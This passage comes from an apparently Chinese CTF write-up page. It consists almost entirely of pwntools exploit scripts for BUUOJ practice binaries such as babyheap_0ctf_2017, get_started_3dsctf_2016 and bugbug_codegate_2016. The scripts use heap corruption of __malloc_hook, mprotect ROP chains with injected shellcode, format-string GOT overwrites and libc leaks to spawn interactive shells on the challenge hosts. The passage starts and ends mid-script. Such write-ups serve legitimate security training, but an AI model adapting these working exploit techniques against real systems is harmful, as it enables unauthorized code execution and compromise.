add(0x10,&#39;\x15\x15&#39;,0x10,&#39;\x16\x16&#39;)</span><br><span class="line">	add(0x10,&#39;&#x2F;bin&#x2F;sh\x00&#39;,0x10,&quot;&#x2F;bin&#x2F;sh\x00&quot;)</span><br><span class="line">	delete(0)</span><br><span class="line">	#gdb.attach(sh.pid)</span><br><span class="line">	add(0x100,&#39;\x17\n&#39;,0x200,0x128 * &#39;a&#39; + p32(elf.got[&#39;free&#39;]))</span><br><span class="line">	show(1)</span><br><span class="line">	sh.recvuntil(&quot;description: &quot;)</span><br><span class="line">	libc_base &#x3D; u32(sh.recv(4)) - libc.symbols[&#39;free&#39;]</span><br><span class="line">	system_addr &#x3D; libc.symbols[&#39;system&#39;] + libc_base</span><br><span class="line">	edit(1,p32(system_addr),0x4)</span><br><span class="line">	delete(3)</span><br><span class="line">	log.success(&quot;libc: &quot; + hex(libc_base))</span><br><span class="line">	log.success(&quot;system_addr:&quot; + hex(system_addr))</span><br><span class="line">	#log.success(&quot;PID: &quot; + str(sh.pid))</span><br><span class="line">	sh.interactive()</span><br><span class="line"></span><br><span class="line">if &quot;__main__&quot; &#x3D;&#x3D; __name__:</span><br><span class="line">	connect(0)</span><br><span class="line">	pwn()</span><br></pre></td></tr></table></figure>
<h2 id="0x04-babyheap-0ctf-2017">0x04 babyheap_0ctf_2017</h2>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level &#x3D; &quot;debug&quot;</span><br><span class="line">sh &#x3D; 0</span><br><span class="line">elf &#x3D; ELF(&quot;babyheap_0ctf_2017&quot;)</span><br><span class="line">libc &#x3D; ELF(&quot;x64_libc.so.6&quot;)</span><br><span class="line">#libc &#x3D; ELF(&quot;libc-2.23.so&quot;)</span><br><span class="line">def add(size):</span><br><span class="line">	sh.recvuntil(&quot;Command: &quot;)</span><br><span class="line">	sh.sendline(&quot;1&quot;)</span><br><span class="line">	sh.recvuntil(&quot;Size: &quot;)</span><br><span class="line">	sh.sendline(str(size))</span><br><span class="line">def edit(idx,size,content):</span><br><span class="line">	sh.recvuntil(&quot;Command: &quot;)</span><br><span class="line">	sh.sendline(&quot;2&quot;)</span><br><span class="line">	sh.recvuntil(&quot;Index: &quot;)</span><br><span class="line">	sh.sendline(str(idx))</span><br><span class="line">	sh.recvuntil(&quot;Size: &quot;)</span><br><span class="line">	sh.sendline(str(size))</span><br><span class="line">	sh.recvuntil(&quot;Content: &quot;)</span><br><span class="line">	sh.send(content)</span><br><span class="line">def delete(idx):</span><br><span class="line">	sh.recvuntil(&quot;Command: &quot;)</span><br><span class="line">	sh.sendline(&quot;3&quot;)</span><br><span class="line">	sh.sendline(str(idx))</span><br><span class="line">def dump(idx):</span><br><span class="line">	sh.recvuntil(&quot;Command: &quot;)</span><br><span class="line">	sh.sendline(&quot;4&quot;)</span><br><span class="line">	sh.recvuntil(&quot;Index: &quot;)</span><br><span class="line">	sh.sendline(str(idx))</span><br><span class="line">def connect(debug):</span><br><span class="line">	global sh</span><br><span class="line">	if(debug &#x3D;&#x3D; 0):</span><br><span class="line">		sh &#x3D; remote(&quot;buuoj.cn&quot;, 20001)</span><br><span class="line">	else:</span><br><span class="line">		sh &#x3D; process(&quot;.&#x2F;babyheap_0ctf_2017&quot;)	</span><br><span class="line">def pwn():</span><br><span class="line">	add(0x10)</span><br><span class="line">	add(0x10)</span><br><span class="line">	add(0x10)</span><br><span class="line">	add(0x10)</span><br><span class="line">	add(0x80)</span><br><span class="line">	delete(1)</span><br><span class="line">	delete(2)</span><br><span class="line">	payload &#x3D; p64(0)*3 + p64(0x21) + p64(0)*3 + p64(0x21) + p8(0x80)</span><br><span class="line">	edit(0,len(payload),payload)</span><br><span class="line">	payload &#x3D; p64(0)*3 + p64(0x21)</span><br><span class="line">	edit(3,len(payload),payload)</span><br><span class="line">	add(0x10)</span><br><span class="line">	add(0x10)</span><br><span class="line">	payload &#x3D; p64(0)*3 + p64(0x91)</span><br><span class="line">	edit(3,len(payload),payload)</span><br><span class="line">	add(0x80)</span><br><span class="line">	delete(4)</span><br><span class="line">	dump(2)</span><br><span class="line">	sh.recvuntil(&quot;Content: \n&quot;)</span><br><span class="line">	libc_base &#x3D; u64(sh.recv(8)) - 0x3C4B78</span><br><span class="line">	malloc_hook &#x3D; libc_base + libc.symbols[&#39;__malloc_hook&#39;]</span><br><span class="line">	log.success(&quot;libc_base: &quot; + hex(libc_base))</span><br><span class="line">	log.success(&quot;__malloc_hook: &quot; + hex(malloc_hook))</span><br><span class="line">	add(0x60)</span><br><span class="line">	delete(4)</span><br><span class="line">	payload &#x3D; p64(malloc_hook - 35)</span><br><span class="line">	edit(2,len(payload),payload)</span><br><span class="line">	add(0x60)</span><br><span class="line">	add(0x60)</span><br><span class="line">	one_gadget &#x3D; 0x4526a</span><br><span class="line">	payload &#x3D; p8(0) * 3 + p64(0) * 2 + p64(libc_base + one_gadget)</span><br><span class="line">	edit(6,len(payload),payload)</span><br><span class="line">	#gdb.attach(sh.pid)</span><br><span class="line">	add(50)</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">	connect(0)</span><br><span class="line">	pwn()</span><br></pre></td></tr></table></figure>
<h2 id="0x05-get-started-3dsctf-2016">0x05 get_started_3dsctf_2016</h2>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.arch &#x3D; &quot;i386&quot;</span><br><span class="line">context.log_level &#x3D; &quot;debug&quot;</span><br><span class="line">#sh &#x3D; process(&quot;.&#x2F;get_started_3dsctf_2016&quot;)</span><br><span class="line">sh &#x3D; remote(&quot;buuoj.cn&quot;,20004)</span><br><span class="line">elf &#x3D; ELF(&quot;get_started_3dsctf_2016&quot;)</span><br><span class="line">pop2_ret &#x3D; 0x0809a7dc</span><br><span class="line">pop3_ret &#x3D; 0x0804f460</span><br><span class="line">payload &#x3D; &#39;a&#39; * 56 + p32(elf.symbols[&#39;mprotect&#39;]) + p32(pop3_ret) + p32(0x080EB000) + p32(0x3000) + p32(7) + p32(elf.symbols[&#39;read&#39;]) + p32(pop3_ret) + p32(0) + p32(0x080EBF80) + p32(0x200) + p32(0x080EBF80)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">#sleep(1)</span><br><span class="line">#input()</span><br><span class="line">sh.sendline(asm(shellcraft.sh()))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="0x06-not-the-same-3dsctf-2016">0x06 not_the_same_3dsctf_2016</h2>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level &#x3D; &quot;debug&quot;</span><br><span class="line">context.arch &#x3D; &quot;i386&quot;</span><br><span class="line">elf &#x3D; ELF(&quot;not_the_same_3dsctf_2016&quot;)</span><br><span class="line">sh &#x3D; 0</span><br><span class="line">lib &#x3D; 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug &#x3D;&#x3D; 1):</span><br><span class="line">		sh &#x3D; process(&quot;.&#x2F;not_the_same_3dsctf_2016&quot;)</span><br><span class="line"></span><br><span class="line">	else:</span><br><span class="line">		sh &#x3D; remote(ip,port)</span><br><span class="line">	pop3_ret &#x3D; 0x0809e3e5</span><br><span class="line">	#sh.recvuntil(&quot;b0r4 v3r s3 7u 4h o b1ch4o m3m0... &quot;)</span><br><span class="line">	offset &#x3D; 45</span><br><span class="line">	payload &#x3D; offset * &quot;a&quot;</span><br><span class="line">	payload +&#x3D; p32(elf.symbols[&#39;mprotect&#39;]) + p32(pop3_ret)</span><br><span class="line">	payload +&#x3D; p32(0x080EB000) + p32(0x1000) + p32(7)</span><br><span class="line">	payload +&#x3D; p32(elf.symbols[&#39;read&#39;]) + p32(pop3_ret)</span><br><span class="line">	payload +&#x3D; p32(0) + p32(0x080EBF81) + p32(0x100) + p32(0x080EBF81)</span><br><span class="line">	sh.sendline(payload)</span><br><span class="line">	payload &#x3D; asm(shellcraft.sh())</span><br><span class="line">	sleep(1)</span><br><span class="line">	sh.sendline(payload)</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">	pwn(&quot;buuoj.cn&quot;,20007,0)</span><br></pre></td></tr></table></figure>
<h2 id="0x07-bugbug-codegate-2016">0x07 bugbug_codegate_2016</h2>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level &#x3D; &quot;debug&quot;</span><br><span class="line">context.arch &#x3D; &quot;i386&quot;</span><br><span class="line">elf &#x3D; ELF(&quot;bugbug_codegate_2016&quot;)</span><br><span class="line">sh &#x3D; 0</span><br><span class="line">lib &#x3D; 0</span><br><span class="line">rand &#x3D; 0</span><br><span class="line">randNum &#x3D; []</span><br><span class="line">def getRand(seed):</span><br><span class="line">	global randNum</span><br><span class="line">	randNum &#x3D; []</span><br><span class="line">	global rand</span><br><span class="line">	rand.sendline(str(seed))</span><br><span class="line">	for i in range(0,6):</span><br><span class="line">		randNum.append(int(rand.recvuntil(&quot;\n&quot;,True),10))</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	global rand</span><br><span class="line">	if(debug &#x3D;&#x3D; 1):</span><br><span class="line">		sh &#x3D; process(&quot;.&#x2F;bugbug_codegate_2016&quot;)</span><br><span class="line">		lib &#x3D; ELF(&quot;&#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc-2.23.so&quot;)</span><br><span class="line">	else:</span><br><span class="line">		sh &#x3D; remote(ip,port)</span><br><span class="line">		lib &#x3D; ELF(&quot;x86_libc.so.6&quot;)</span><br><span class="line">	#one step. make exit_got-&gt;start.finish loop</span><br><span class="line">	payload &#x3D; p32(elf.got[&#39;exit&#39;]) + &quot;%.&quot; + str(0x8580 - 3) + &quot;d%17$hn&quot;</span><br><span class="line">	size &#x3D; len(payload)</span><br><span class="line">	payload &#x3D; payload.ljust(0x64,&quot;a&quot;)</span><br><span class="line">	sh.recv()</span><br><span class="line">	sh.send(payload)</span><br><span class="line">	sh.recvuntil(payload)</span><br><span class="line">	ptr &#x3D; u32(sh.recv(4))</span><br><span class="line">	stream &#x3D; u32(sh.recv(4))</span><br><span class="line">	rand &#x3D; process(&quot;.&#x2F;rand&quot;)</span><br><span class="line">	getRand(ptr)</span><br><span class="line">	sh.sendline(str(randNum[0]) + &quot; &quot;</span><br><span class="line">		+str(randNum[1]) + &quot; &quot;</span><br><span class="line">		+str(randNum[2]) + &quot; &quot;</span><br><span class="line">		+str(randNum[3]) + &quot; &quot;</span><br><span class="line">		+str(randNum[4]) + &quot; &quot;</span><br><span class="line">		+str(randNum[5]))</span><br><span class="line">	log.success(&quot;1 ptr &#x3D; &quot; + hex(ptr))</span><br><span class="line">	rand.close()</span><br><span class="line">	#two step. libc leak</span><br><span class="line">	sh.recvuntil(&quot;Who are you? &quot;)</span><br><span class="line">	payload &#x3D; p32(elf.got[&#39;__libc_start_main&#39;]) + &quot;%17$s&quot;</span><br><span class="line">	size &#x3D; len(payload)</span><br><span class="line">	payload &#x3D; payload.ljust(0x64,&quot;a&quot;)</span><br><span class="line">	sh.send(payload)</span><br><span class="line">	sh.recvuntil(payload)</span><br><span class="line">	ptr &#x3D; u32(sh.recv(4))</span><br><span class="line">	stream &#x3D; u32(sh.recv(4))</span><br><span class="line">	rand &#x3D; process(&quot;.&#x2F;rand&quot;)</span><br><span class="line">	getRand(ptr)</span><br><span class="line">	sh.sendline(str(randNum[0]) + &quot; &quot;</span><br><span class="line">		+str(randNum[1]) + &quot; &quot;</span><br><span class="line">		+str(randNum[2]) + &quot; &quot;</span><br><span class="line">		+str(randNum[3]) + &quot; &quot;</span><br><span class="line">		+str(randNum[4]) + &quot; &quot;</span><br><span class="line">		+str(randNum[5]))</span><br><span class="line">	rand.close()</span><br><span class="line">	sh.recvuntil(&quot;Congratulation, &quot;)</span><br><span class="line">	sh.recv(4)</span><br><span class="line">	__libc_start_main &#x3D; u32(sh.recv(4))</span><br><span class="line">	libc &#x3D; __libc_start_main - lib.symbols[&#39;__libc_start_main&#39;]</span><br><span class="line">	puts &#x3D; libc + lib.symbols[&#39;puts&#39;]</span><br><span class="line">	system &#x3D; libc + lib.symbols[&#39;system&#39;]</span><br><span class="line">	printf &#x3D; libc + lib.symbols[&#39;printf&#39;]</span><br><span class="line">	one_gadget &#x3D; libc + 0x5f066</span><br><span class="line">	one_gadget1 &#x3D; one_gadget &gt;&gt; 16</span><br><span class="line">	one_gadget2 &#x3D; one_gadget % (0x10000)</span><br><span class="line">	log.success(&quot;2 ptr &#x3D; &quot; + hex(ptr))</span><br><span class="line">	log.success(&quot;libc &#x3D; &quot; + hex(libc))</span><br><span class="line">	log.success(&quot;puts &#x3D; &quot; + hex(puts))</span><br><span class="line">	log.success(&quot;system &#x3D; &quot; + hex(system))</span><br><span class="line">	log.success(&quot;printf &#x3D; &quot; + hex(printf))</span><br><span class="line">	log.success(&quot;one_gadget &#x3D; &quot; + hex(one_gadget))</span><br><span class="line">	log.success(&quot;__libc_start_main &#x3D; &quot; + hex(__libc_start_main))</span><br><span class="line">	#modify exit_got to one_gadget</span><br><span class="line">	#bp printf 0x08048960</span><br><span class="line">	#exit_got 0x0804A024</span><br><span class="line">	sh.recvuntil(&quot;Who are you? &quot;)</span><br><span class="line">	payload  &#x3D; p32(elf.got[&#39;exit&#39;]) + p32(elf.got[&#39;exit&#39;] + 2)</span><br><span class="line">	payload +&#x3D; &quot;%&quot; + str(one_gadget2 - 8) + &quot;d&quot; + &quot;%17$hn%&quot; + str(one_gadget1 - one_gadget2) + &quot;d%18$hn&quot;</span><br><span class="line">	size &#x3D; len(payload)</span><br><span class="line">	payload &#x3D; payload.ljust(0x64,&quot;a&quot;)</span><br><span class="line">	sh.send(payload)</span><br><span class="line">	sh.recvuntil(payload)</span><br><span class="line">	ptr &#x3D; u32(sh.recv(4))</span><br><span class="line">	stream &#x3D; u32(sh.recv(4))</span><br><span class="line">	rand &#x3D; process(&quot;.&#x2F;rand&quot;)</span><br><span class="line">	getRand(ptr)</span><br><span class="line">	#input()</span><br><span class="line">	sh.sendline(str(randNum[0]) + &quot; &quot;</span><br><span class="line">		+str(randNum[1]) + &quot; &quot;</span><br><span class="line">		+str(randNum[2]) + &quot; &quot;</span><br><span class="line">		+str(randNum[3]) + &quot; &quot;</span><br><span class="line">		+str(randNum[4]) + &quot; &quot;</span><br><span class="line">		+str(randNum[5]))</span><br><span class="line">	rand.close()</span><br><span class="line">	sh.recvuntil(&quot;Congratulation, &quot;)</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">	pwn(&quot;buuoj.cn&quot;,20027,0)</span><br></pre></td></tr></table></figure>
<p>另外附上随机数生成器</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line">#include&lt;unistd.h&gt;</span><br><span class="line">int main()&#123;</span><br><span class="line">	unsigned int seed &#x3D; 0;</span><br><span class="line">	scanf(&quot;%u&quot;,&amp;seed);</span><br><span class="line">	srand(seed);</span><br><span class="line">	int i &#x3D; 0;</span><br><span class="line">	int j &#x3D; 0;</span><br><span class="line">	int tmp;</span><br><span class="line">	int v4[6] &#x3D; &#123;0,0,0,0,0,0&#125;;</span><br><span class="line">	for ( i &#x3D; 0; i &lt;&#x3D; 5; ++i )&#123;</span><br><span class="line">		tmp &#x3D; rand() % 45 + 1;</span><br><span class="line">		LABEL_6:</span><br><span class="line">		for ( j &#x3D; 0; i - 1 &gt;&#x3D; j; ++j )&#123;</span><br><span class="line">			if ( v4[j] &#x3D;&#x3D; tmp )</span><br><span class="line">				goto LABEL_6;</span><br><span class="line">		&#125;</span><br><span class="line">		v4[i] &#x3D; tmp;</span><br><span class="line">	&#125;</span><br><span class="line">	for( i &#x3D; 0; i&lt;&#x3D;5 ;++i)&#123;</span><br><span class="line">		printf(&quot;%d\n&quot;,v4[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="0x08-ez-pz-hackover-2016">0x08 ez_pz_hackover_2016</h2>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level &#x3D; &quot;debug&quot;</span><br><span class="line">context.arch &#x3D; &quot;i386&quot;</span><br><span class="line">elf &#x3D; ELF(&quot;ez_pz_hackover_2016&quot;)</span><br><span class="line">sh &#x3D; 0</span><br><span class="line">lib &#x3D; 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug &#x3D;&#x3D; 1):</span><br><span class="line">		sh &#x3D; process(&quot;.&#x2F;ez_pz_hackover_2016&quot;)</span><br><span class="line"></span><br><span class="line">	else:</span><br><span class="line">		sh &#x3D; remote(ip,port)</span><br><span class="line">	sh.recvuntil(&quot;Yippie, lets crash: 0x&quot;)</span><br><span class="line">	str_addr &#x3D; int(sh.recvuntil(&quot;\n&quot;,True),16)</span><br><span class="line">	offset &#x3D; 16</span><br><span class="line">	payload  &#x3D; &quot;crashme\x00&quot;</span><br><span class="line">	payload  &#x3D; payload.ljust(10,&quot;\x00&quot;)</span><br><span class="line">	payload +&#x3D; offset * &quot;a&quot;</span><br><span class="line">	payload +&#x3D; p32(str_addr + len(payload) + 4 - 0x3a) + asm(shellcraft.sh())</span><br><span class="line">	sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">	pwn(&quot;buuoj.cn&quot;,20040,0)</span><br></pre></td></tr></table></figure>
<h2 id="0x09-tiny-backdoor-v1-hackover-2016">0x09 tiny_backdoor_v1_hackover_2016</h2>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level &#x3D; &quot;debug&quot;</span><br><span class="line">context.arch &#x3D; &quot;amd64&quot;</span><br><span class="line">elf &#x3D; ELF(&quot;tiny_backdoor_v1_hackover_2016&quot;)</span><br><span class="line">sh &#x3D; 0</span><br><span class="line">lib &#x3D; 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug &#x3D;&#x3D; 1):</span><br><span class="line">		sh &#x3D; process(&quot;.&#x2F;tiny_backdoor_v1_hackover_2016&quot;)</span><br><span class="line"></span><br><span class="line">	else:</span><br><span class="line">		sh &#x3D; remote(ip,port)</span><br><span class="line"></span><br><span class="line">	#payload &#x3D; &quot;a&quot;*0x9</span><br><span class="line">	key &#x3D; &#39;e6d9f6382a02fd3ac3&#39;.decode(&#39;hex&#39;)</span><br><span class="line">	sh.send(key)</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">	pwn(&quot;buuoj.cn&quot;,20050,0)</span><br></pre></td></tr></table></figure>
<h2 id="0x10-bbys-tu-2016">0x10 bbys_tu_2016</h2>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level &#x3D; &quot;debug&quot;</span><br><span class="line">context.arch &#x3D; &quot;i386&quot;</span><br><span class="line">elf &#x3D; ELF(&quot;bbys_tu_2016&quot;)</span><br><span class="line">sh &#x3D; 0</span><br><span class="line">lib &#x3D; 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug &#x3D;&#x3D; 1):</span><br><span class="line">		sh &#x3D; process(&quot;.&#x2F;bbys_tu_2016&quot;)</span><br><span class="line"></span><br><span class="line">	else:</span><br><span class="line">		sh &#x3D; remote(ip,port)</span><br><span class="line"></span><br><span class="line">	offset &#x3D; 24</span><br><span class="line">	payload  &#x3D; offset * &quot;a&quot;</span><br><span class="line">	payload +&#x3D; p32(0x0804856D)</span><br><span class="line">	sh.sendline(payload)</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">	pwn(&quot;buuoj.cn&quot;,20060,0)</span><br></pre></td></tr></table></figure>
<h2 id="0x11-oneshot-tjctf-2016">0x11 oneshot_tjctf_2016</h2>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level &#x3D; &quot;debug&quot;</span><br><span class="line">context.arch &#x3D; &quot;amd64&quot;</span><br><span class="line">elf &#x3D; ELF(&quot;oneshot_tjctf_2016&quot;)</span><br><span class="line">sh &#x3D; 0</span><br><span class="line">lib &#x3D; 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug &#x3D;&#x3D; 1):</span><br><span class="line">		sh &#x3D; process(&quot;.&#x2F;oneshot_tjctf_2016&quot;)</span><br><span class="line">		lib &#x3D; ELF(&quot;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.23.so&quot;)</span><br><span class="line">	else:</span><br><span class="line">		sh &#x3D; remote(ip,port)</span><br><span class="line">		lib &#x3D; ELF(&quot;x64_libc.so.6&quot;)</span><br><span class="line">	sh.recvuntil(&quot;Read location?\n&quot;)</span><br><span class="line">	sh.sendline(str(elf.got[&#39;__libc_start_main&#39;]))</span><br><span class="line">	sh.recvuntil(&quot;Value: 0x0000&quot;)</span><br><span class="line">	__libc_start_main &#x3D; int(sh.recvuntil(&quot;\n&quot;,True),16)</span><br><span class="line">	libc &#x3D; __libc_start_main - 